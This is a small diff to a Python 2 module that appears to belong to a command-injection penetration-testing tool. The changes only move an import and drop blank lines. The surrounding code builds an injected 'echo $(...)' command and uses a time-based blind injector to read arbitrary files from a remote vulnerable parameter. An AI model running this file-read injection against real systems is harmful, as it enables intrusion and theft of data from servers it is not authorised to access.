@@ -20,8 +20,8 @@ import urllib2
 
 from src.utils import menu
 from src.utils import settings
-from src.thirdparty.colorama import Fore, Back, Style, init
 
+from src.thirdparty.colorama import Fore, Back, Style, init
 from src.core.injections.blind_based.techniques.time_based import tb_injector
 
 """
@@ -33,13 +33,11 @@ def do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method,
   #  Read file
   if menu.options.file_read:
     file_to_read = menu.options.file_read
-    
     # Execute command
     cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
     check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
     shell = output 
     shell = "".join(str(p) for p in shell)
-    
     if shell:
       if menu.options.verbose:
         print ""
